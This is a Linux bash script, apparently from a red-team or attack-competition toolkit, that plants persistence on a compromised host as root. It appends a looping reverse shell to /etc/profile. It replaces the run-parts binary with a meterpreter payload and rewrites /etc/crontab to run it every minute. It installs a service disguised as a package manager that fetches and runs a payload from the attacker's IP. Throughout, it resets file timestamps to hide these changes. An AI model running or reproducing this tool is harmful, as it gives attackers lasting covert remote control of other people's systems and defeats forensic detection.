#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi



# *** Helper Functions ***

# Colored text output
cecho () {
	ColorOff='\033[0m'
	BWhite='\033[1;37m'
	Red='\033[0;31m'
	Yellow='\033[0;33m'
	Cyan='\033[0;36m'
	Blue='\033[0;34m'
	Purple='\033[0;35m'
	Green='\033[0;32m'

	local CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"

	if [ $# -ne 2 ]; then
		echo -e "$CechoUsage"
		return 1
	fi

	local LogType=$1
	local LogMessage=$2

	case $LogType in
		"task")
			echo
			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
			;;
		"error")
			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
			;;
		"warning")
			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
			;;
		"info")
			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
			;;
		"log")
			echo -e "${Blue}[^] ${LogMessage}${ColorOff}"
			;;
		"debug")
			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
			;;
		"done")
			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
			;;
		*)
			echo -e "$CechoUsage"
			;;
	esac
}

# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
get_timestamp () {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}

set_timestamp () {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}



# *** Configurable variables ***

IP="10.10.2.4"
NORMAL_PORT="59000"
WEB_PORT="59001"
REVERSE_PORT="59002"
BIND_PORT="60000"
FIFO="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
GLOBAL_PROFILE="/etc/profile"

# Crontab meterpreter
METERPRETER="/tmp/linux_$NORMAL_PORT"
CRONTAB="/etc/crontab"
CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"

# Web delivery meterpreter
WEB_URI="gnano"
WEB_PORT="8080"

# Services
SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
SERVICE_NAME="system-pkg"
#SERVICE_COMMAND="/usr/bin/test -f $SERVICE_PAYLOAD_PATH || $(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; $(which chmod) +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
SERVICE_COMMAND="$(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI && $(which chmod) +x $SERVICE_PAYLOAD_PATH && $SERVICE_PAYLOAD_PATH && exit 0"

# systemd
SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
SYSTEMD_SERVICE="[Unit]
Description=Binary Repository Package Manager

[Service]
Type=simple
ExecStart=$SERVICE_COMMAND
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"

# SysVInit
INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
INIT_PID_PATH="/var/run/brpm.pid"
INIT_SERVICE="description \"binary repository package manager\"
start on filesystem or runlevel 2345
stop on shutdown
script
    echo \$\$ > $INIT_PID_PATH
    $SERVICE_COMMAND
end script"



# *** Main ***

cecho task "Persisting reverse shells in '$GLOBAL_PROFILE'"

# Boilerplate revere_shells code taken from:
# Reverse Shell as a Service - https://reverse-shell.sh/ip:port
# https://github.com/lukechilds/reverse-shell
reverse_shells="
(setsid sh -c \"while true; do
  if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"$IP\\\",$REVERSE_PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' 2>/dev/null
    sleep 10
    continue
  fi

  if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;\$i=\\\"$IP\\\";\$p=$REVERSE_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};' 2>/dev/null
		sleep 10
		continue
  fi

  if command -v nc > /dev/null 2>&1; then
    rm $FIFO;mkfifo $FIFO;cat $FIFO|/bin/sh -i 2>&1|nc $IP $REVERSE_PORT >$FIFO
		sleep 10
		continue
  fi

  if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/$IP/$REVERSE_PORT 0>&1
		sleep 10
		continue
  fi
done\")&"

if [ -f "$GLOBAL_PROFILE" ]; then
	profile_timestamp=$(get_timestamp "$GLOBAL_PROFILE")

	if grep -q "setsid sh" "$GLOBAL_PROFILE"; then
		cecho log "Reverse shell persistence already in '$GLOBAL_PROFILE', skipping"
	else
		echo "$reverse_shells" >> "$GLOBAL_PROFILE" && cecho info "Added reverse shell persistence to '$GLOBAL_PROFILE'" || cecho error "Could not add reverse shell persistence to '$GLOBAL_PROFILE'"
	fi

	set_timestamp $profile_timestamp "$GLOBAL_PROFILE"
else
	cecho warning "'$GLOBAL_PROFILE' does not exist, skipping reverse shell persistence"
fi

cecho done "Done persisting reverse shells in '$GLOBAL_PROFILE'"



cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"

if [ -x "$METERPRETER" ]; then
	if [ -f "$CRONTAB" ]; then
		if ! which run-parts &>/dev/null; then
			cecho error "'run-parts' not on PATH, cannot plant meterpreter persistence in '$CRONTAB', skipping"
		else
			run_parts_path=$(which run-parts)

			usr_bin_timestamp=$(get_timestamp "/usr/bin") 
			bin_timestamp=$(get_timestamp "/bin")
			run_parts_timestamp=$(get_timestamp "$run_parts_path")
			etc_timestamp=$(get_timestamp "/etc")
			crontab_timestamp=$(get_timestamp "$CRONTAB")

			if cp -f "$METERPRETER" "$run_parts_path" 2>/dev/null; then
				cecho info "Copied meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path'"

				# The whole purpose of this is to change the callback frequency to every minute, not
				# whatever its default is which I believe is on the 17th minute of every hour.
				if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
					cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
				elif grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
					sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
				elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
					first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
					prepended="$CRONTAB_REPLACE\n$first_task"
					sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
				else # nothing exists in crontab
					echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
				fi

				set_timestamp $usr_bin_timestamp "/usr/bin"
				set_timestamp $bin_timestamp "/bin"
				set_timestamp $run_parts_timestamp "$run_parts_path"
				set_timestamp $etc_timestamp "/etc"
				set_timestamp $crontab_timestamp "$CRONTAB"
			else
				cecho error "Could not copy meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path', skipping"
			fi
		fi
	else
		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
	fi
else
	cecho error "Meterpreter binary '$METERPRETER' not executable/doesn't exist, skipping stealthy crontab persistence"
fi

cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"



cecho task "Persisting meterpreter via web delivery as a service"

if pidof systemd &>/dev/null; then # systemd
	if [ -f "$SYSTEMD_SERVICE_PATH" ]; then
		cecho log "Malicious service already exists at '$SYSTEMD_SERVICE_PATH'"
	else
		etc_system_timestamp=$(get_timestamp "/etc/systemd/system")
		bin_timestamp=$(get_timestamp "/bin")

		if echo "$SYSTEMD_SERVICE" > "$SYSTEMD_SERVICE_PATH"; then
			cecho info "Malicious service created at '$SYSTEMD_SERVICE_PATH'"
			chmod 644 "$SYSTEMD_SERVICE_PATH"
		else
			echo error "Could not add malicious service at '$SYSTEMD_SERVICE_PATH'"
		fi

		systemctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
		systemctl enable "$SERVICE_NAME" && cecho info "Enabled malicious service '$SERVICE_NAME'" || cecho error "Could not enable maliicous service '$SERVICE_NAME'"

		sleep 1 # ensure everything's ran before modifying timestamps

		set_timestamp $etc_system_timestamp "/etc/systemd/system"
		set_timestamp $etc_system_timestamp "$SYSTEMD_SERVICE_PATH"
		set_timestamp $bin_timestamp "/bin"
		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
	fi
elif [ -d "/etc/init" ]; then # SysVInit
	if [ -f "$INIT_SERVICE_PATH" ]; then
		cecho log "Malicious service already exists at '$INIT_SERVICE_PATH'"
	else
		init_timestamp=$(get_timestamp "/etc/init")
		run_timestamp=$(get_timestamp "/var/run")
		bin_timestamp=$(get_timestamp "/bin")

		if echo "$INIT_SERVICE" > "$INIT_SERVICE_PATH"; then
			cecho info "Malicious service created at '$INIT_SERVICE_PATH'"
			chmod 644 "$INIT_SERVICE_PATH"
		else
			cecho error "Could not add malicious service at '$INIT_SERVICE_PATH'"
		fi

		initctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"

		sleep 1 # ensure everything's ran before modifying timestamps

		set_timestamp $init_timestamp "/etc/init"
		set_timestamp $init_timestamp "$INIT_SERVICE_PATH"
		set_timestamp $run_timestamp "/var/run"
		set_timestamp $run_timestamp "$INIT_PID_PATH"
		set_timestamp $bin_timestamp "/bin"
		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
	fi
else # unknown
	cecho error "No valid init systems detected for meterpreter web delivery service persistence"
fi

cecho done "Done persisting meterpreter via web delivery as a service"



# Bind shell
#if $(which nc); then
#	nc_dir=""
#	nc_name="tmp"
#	/bin/bash -c mkdir -p "/tmp/$nc_dir" && cp "/usr/bin/nc" "/tmp/$nc_dir/$nc_name" & while true; do "/tmp/$nc_dir/$nc_name" -nlp 60000 -e /bin/bash; done
#else
#	cecho warning "netcat binary not present on system, cannot install bind shell"
#fi



echo
cecho done "--- ALL PERSISTENCE PLANTED ---"
cecho debug "Don't forget to delete me!"
